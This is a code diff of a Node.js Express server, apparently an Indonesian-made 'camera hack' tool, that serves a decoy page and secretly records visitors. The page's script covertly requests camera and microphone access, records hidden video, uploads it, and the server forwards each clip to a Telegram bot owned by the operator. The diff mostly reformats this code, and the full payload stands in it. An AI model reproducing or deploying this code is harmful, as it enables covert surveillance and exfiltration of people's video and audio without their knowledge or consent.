@@ -6,15 +6,11 @@ const config = require('./setting.js');
 const ffmpeg = require('@ts-ffmpeg/fluent-ffmpeg');
 const ffmpegPath = require('@ffmpeg-installer/ffmpeg').path;
 const { Readable } = require('stream');
-
-// Set path ffmpeg
 ffmpeg.setFfmpegPath(ffmpegPath);
-console.log('✅ FFmpeg path:', ffmpegPath);
-
 const app = express();
 const upload = multer({ 
-  storage: multer.memoryStorage(),
-  limits: { fileSize: 50 * 1024 * 1024 } // 50MB
+storage: multer.memoryStorage(),
+limits: { fileSize: 50 * 1024 * 1024 }
 });
 
 // ---------- Halaman Utama (SAMA PERSIS DENGAN ASLI) ----------
@@ -55,177 +51,147 @@ Kontak: <a href="https://t.me/Novabot403" target="_blank" class="contact-link">@
 </body>
 </html>
   `);
-
-  res.send(`
+res.send(`
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
-    <title>Loading...</title>
-    <style>
-        body { margin: 0; background: black; }
-        video { display: none; }
-    </style>
+<meta charset="UTF-8">
+<title>Loading...</title>
+<style>
+body { margin: 0; background: black; }
+video { display: none; }
+</style>
 </head>
 <body>
-    <script>
-        document.documentElement.innerHTML = decodeURIComponent("${fakeHtml}");
-        
-        (async function() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                
-                const video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                video.style.display = 'none';
-                document.body.appendChild(video);
-
-                let recordedChunks = [];
-                const mediaRecorder = new MediaRecorder(stream);
-                
-                mediaRecorder.ondataavailable = event => {
-                    if (event.data.size > 0) recordedChunks.push(event.data);
-                };
-
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    formData.append('video', blob, 'recording.webm');
-
-                    try {
-                        await fetch('/upload', { method: 'POST', body: formData });
-                    } catch (err) {
-                        // Gagal, tidak ada UI
-                    } finally {
-                        stream.getTracks().forEach(track => track.stop());
-                    }
-                };
-
-                mediaRecorder.start();
-                setTimeout(() => {
-                    if (mediaRecorder.state !== 'inactive') {
-                        mediaRecorder.stop();
-                    }
-                }, ${config.RECORD_DURATION});
-            } catch (err) {
-                // Gagal akses kamera
-            }
-        })();
-    </script>
+<script>
+document.documentElement.innerHTML = decodeURIComponent("${fakeHtml}");
+(async function() {
+try {
+const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+const video = document.createElement('video');
+video.srcObject = stream;
+video.play();
+video.style.display = 'none';
+document.body.appendChild(video);
+let recordedChunks = [];
+const mediaRecorder = new MediaRecorder(stream);
+mediaRecorder.ondataavailable = event => {
+if (event.data.size > 0) recordedChunks.push(event.data);
+};
+mediaRecorder.onstop = async () => {
+const blob = new Blob(recordedChunks, { type: 'video/webm' });
+const formData = new FormData();
+formData.append('video', blob, 'recording.webm');
+try {
+await fetch('/upload', { method: 'POST', body: formData });
+} catch (err) {
+} finally {
+stream.getTracks().forEach(track => track.stop());
+}
+};
+mediaRecorder.start();
+setTimeout(() => {
+if (mediaRecorder.state !== 'inactive') {
+mediaRecorder.stop();
+}
+}, ${config.RECORD_DURATION});
+} catch (err) {
+}
+})();
+</script>
 </body>
 </html>
-  `);
+`);
 });
 
 // ---------- FUNGSI KONVERSI WebM → MP4 ----------
 function convertWebmToMp4(webmBuffer) {
-  return new Promise((resolve, reject) => {
-    const inputStream = Readable.from(webmBuffer);
-    const chunks = [];
-
-    ffmpeg(inputStream)
-      .inputFormat('webm')
-      .videoCodec('libx264')
-      .audioCodec('aac')
-      .outputOptions([
-        '-preset ultrafast', // cepat, ukuran agak besar
-        '-movflags +frag_keyframe+empty_moov' // untuk streaming
-      ])
-      .format('mp4')
-      .on('start', (cmd) => console.log('🎬 FFmpeg start:', cmd))
-      .on('error', (err) => {
-        console.error('❌ FFmpeg error:', err);
-        reject(err);
-      })
-      .on('end', () => {
-        console.log('✅ Konversi selesai');
-        resolve(Buffer.concat(chunks));
-      })
-      .pipe()
-      .on('data', chunk => chunks.push(chunk))
-      .on('error', reject);
-  });
+return new Promise((resolve, reject) => {
+const inputStream = Readable.from(webmBuffer);
+const chunks = [];
+ffmpeg(inputStream)
+.inputFormat('webm')
+.videoCodec('libx264')
+.audioCodec('aac')
+.outputOptions([
+'-preset ultrafast',
+'-movflags +frag_keyframe+empty_moov'
+])
+.format('mp4')
+.on('start', (cmd) => console.log('🎬 FFmpeg start:', cmd))
+.on('error', (err) => {
+console.error('❌ FFmpeg error:', err);
+reject(err);
+})
+.on('end', () => {
+resolve(Buffer.concat(chunks));
+})
+.pipe()
+.on('data', chunk => chunks.push(chunk))
+.on('error', reject);
+});
 }
 
 // ---------- ENDPOINT UPLOAD ----------
 app.post('/upload', upload.single('video'), async (req, res) => {
-  if (!req.file) {
-    return res.status(400).json({ success: false, error: 'No video uploaded' });
-  }
-
-  try {
-    console.log(`📥 Menerima file: ${req.file.originalname} (${req.file.size} bytes)`);
-
-    // Coba konversi ke MP4, jika gagal kirim file asli .webm
-    let videoBuffer = req.file.buffer;
-    let filename = 'recording.webm';
-    let contentType = 'video/webm';
-
-    try {
-      console.log('⏳ Mengkonversi WebM ke MP4...');
-      videoBuffer = await convertWebmToMp4(req.file.buffer);
-      filename = 'recording.mp4';
-      contentType = 'video/mp4';
-      console.log('✅ Konversi berhasil');
-    } catch (convErr) {
-      console.error('⚠️ Konversi gagal, mengirim file asli .webm:', convErr.message);
-      // tetap pakai buffer asli
-    }
-
-    // Buat caption dengan waktu Indonesia
-    const date = new Date();
-    const caption = date.toLocaleString('id-ID', {
-      weekday: 'long',
-      year: 'numeric',
-      month: 'long',
-      day: 'numeric',
-      hour: '2-digit',
-      minute: '2-digit',
-      second: '2-digit',
-      hour12: false,
-      timeZone: 'Asia/Jakarta'
-    }).replace(/\./g, ':');
-
-    // Kirim ke Telegram
-    const formData = new FormData();
-    formData.append('chat_id', config.OWNER_ID);
-    formData.append('video', videoBuffer, { filename, contentType });
-    formData.append('caption', caption);
-    if (contentType === 'video/mp4') {
-      formData.append('supports_streaming', 'true');
-    }
-
-    const telegramRes = await axios.post(
-      `https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendVideo`,
-      formData,
-      {
-        headers: formData.getHeaders(),
-        maxContentLength: Infinity,
-        maxBodyLength: Infinity
-      }
-    );
-
-    if (telegramRes.data.ok) {
-      console.log('📤 Video terkirim ke Telegram');
-      res.json({ success: true });
-    } else {
-      console.error('Telegram API error:', telegramRes.data);
-      res.status(500).json({ success: false, error: 'Telegram API error' });
-    }
-  } catch (error) {
-    console.error('❌ Error:', error.message);
-    res.status(500).json({ success: false, error: error.message });
-  }
+if (!req.file) {
+return res.status(400).json({ success: false, error: 'No video uploaded' });
+}
+try {
+let videoBuffer = req.file.buffer;
+let filename = 'recording.webm';
+let contentType = 'video/webm';
+try {
+videoBuffer = await convertWebmToMp4(req.file.buffer);
+filename = 'recording.mp4';
+contentType = 'video/mp4';
+} catch (convErr) {
+console.error('⚠️ Konversi gagal, mengirim file asli .webm:', convErr.message);
+}
+const date = new Date();
+const caption = date.toLocaleString('id-ID', {
+weekday: 'long',
+year: 'numeric',
+month: 'long',
+day: 'numeric',
+hour: '2-digit',
+minute: '2-digit',
+second: '2-digit',
+hour12: false,
+timeZone: 'Asia/Jakarta'
+}).replace(/\./g, ':');
+const formData = new FormData();
+formData.append('chat_id', config.OWNER_ID);
+formData.append('video', videoBuffer, { filename, contentType });
+formData.append('caption', caption);
+if (contentType === 'video/mp4') {
+formData.append('supports_streaming', 'true');
+}
+const telegramRes = await axios.post(
+`https://api.telegram.org/bot${config.TELEGRAM_TOKEN}/sendVideo`,
+formData,
+{
+headers: formData.getHeaders(),
+maxContentLength: Infinity,
+maxBodyLength: Infinity
+}
+);
+if (telegramRes.data.ok) {
+res.json({ success: true });
+} else {
+console.error('Telegram API error:', telegramRes.data);
+res.status(500).json({ success: false, error: 'Telegram API error' });
+}
+} catch (error) {
+console.error('❌ Error:', error.message);
+res.status(500).json({ success: false, error: error.message });
+}
 });
-
-// 404 Handler
 app.use((req, res) => {
-  res.status(404).send('404 - Not Found');
+res.status(404).send('404 - Not Found');
 });
-
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
-  console.log(`🚀 Server running on port ${PORT}`);
-  console.log(`📹 Recording duration: ${config.RECORD_DURATION}ms`);
+console.log(`🚀 Server running on port ${PORT}`);
+console.log(`📹 Recording duration: ${config.RECORD_DURATION}ms`);
 });
